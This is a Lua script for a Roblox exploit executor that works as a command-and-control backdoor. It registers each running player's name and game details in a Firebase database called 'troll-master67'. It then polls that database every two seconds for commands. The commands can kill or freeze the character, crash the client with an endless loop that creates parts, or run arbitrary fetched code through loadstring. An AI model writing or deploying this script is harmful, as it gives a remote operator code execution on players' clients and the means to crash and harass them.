local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
local MY_ROLE = "User" 
local POLL_RATE = 2.0   

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ALLOWED_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_ "

local function getShiftValue(display)
    return (#display % #ALLOWED_CHARS) + 1
end

local function encryptName(name, display)
    if name == "all" then return "all" end
    local shift = getShiftValue(display)
    local first = name:sub(1, 1)
    local rest = name:sub(2)
    local encrypted = ""
    for i = 1, #rest do
        local ch = rest:sub(i, i)
        local idx = ALLOWED_CHARS:find(ch, 1, true)
        if idx then
            local newIdx = (idx + shift - 1) % #ALLOWED_CHARS + 1
            encrypted = encrypted .. ALLOWED_CHARS:sub(newIdx, newIdx)
        else
            encrypted = encrypted .. ch
        end
    end
    return first .. encrypted
end

local roleMap = { ["Owner"] = "x8z9A", ["Admin"] = "k2L1p", ["User"] = "m5N0q" }
local lastCommandId = ""

local function getCharacterElements()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hum = char:WaitForChild("Humanoid", 5)
    local root = char:WaitForChild("HumanoidRootPart", 5)
    return char, hum, root
end

local function getLiveStatus()
    local _, hum, _ = pcall(getCharacterElements)
    if hum then
        local hp = math.floor(hum.Health)
        local maxHp = math.floor(hum.MaxHealth)
        local pct = math.floor((hp / maxHp) * 100)
        return {
            health = string.format("%d/%d (%d%%)", hp, maxHp, pct),
            walkspeed = tostring(hum.WalkSpeed),
            jumppower = tostring(hum.JumpPower),
            gravity = tostring(workspace.Gravity)
        }
    end
    return { health = "0/0 (0%)", walkspeed = "0", jumppower = "0", gravity = "Normal" }
end

local function registerToDatabase()
    local encName = encryptName(LocalPlayer.Name, LocalPlayer.Name)
    local encRole = roleMap[MY_ROLE] or "m5N0q"
    local status = getLiveStatus()

    local playerData = {
        name = encName,
        role = encRole,
        gameId = tostring(game.JobId),
        placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
        currentHealth = status.health,
        currentSpeed = status.walkspeed,
        currentJump = status.jumppower,
        currentGrav = status.gravity
    }

    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        pcall(function()
            request({
                Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json",
                Method = "PUT",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(playerData)
            })
        end)
    end
end

Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        local request = (syn and syn.request) or (http and http.request) or http_request or request
        if request then
            request({ Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json", Method = "DELETE" })
        end
    end
end)

local function executeIncomingCommand(cmd, arg)
    local char, hum, root = getCharacterElements()
    if not hum or not root then return end

    if cmd == "reset" then
        hum.Health = 0
    elseif cmd == "freeze" then
        root.Anchored = true
    elseif cmd == "unfreeze" then
        root.Anchored = false
    elseif cmd == "walkspeed" then
        hum.WalkSpeed = tonumber(arg) or 16
    elseif cmd == "jumppower" then
        hum.UseJumpPower = true
        hum.JumpPower = tonumber(arg) or 50
    elseif cmd == "gravity" then
        workspace.Gravity = tonumber(arg) or 196.2
    elseif cmd == "crash" then
        task.spawn(function()
            while true do
                pcall(function()
                    local parts = {}
                    for i = 1, 10000 do table.insert(parts, Instance.new("Part")) end
                end)
            end
        end)
    elseif cmd == "sound" then
        local s = Instance.new("Sound", root)
        s.SoundId = "rbxassetid://" .. (tonumber(arg) or 0)
        s.Volume = 2
        s:Play()
        s.Ended:Connect(function() s:Destroy() end)
    elseif cmd == "animation" then
        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://" .. (tonumber(arg) or 0)
        local track = hum:WaitForChild("Animator"):LoadAnimation(anim)
        track:Play()
    elseif cmd == "executescript" then
        if loadstring then
            pcall(loadstring(arg))
        end
    end
end

task.spawn(function()
    while true do
        pcall(function()
            registerToDatabase()
            local response = game:HttpGet(FIREBASE_URL .. "command.json")
            if response and response ~= "null" then
                local data = HttpService:JSONDecode(response)
                if data and data.id ~= lastCommandId then
                    lastCommandId = data.id
                    if data.target == "all" then
                        if MY_ROLE ~= "Owner" then
                            executeIncomingCommand(data.command, data.message)
                        end
                    elseif data.target == LocalPlayer.Name then
                        executeIncomingCommand(data.command, data.message)
                    end
                end
            end
        end)
        task.wait(POLL_RATE)
    end
end)

registerToDatabase()
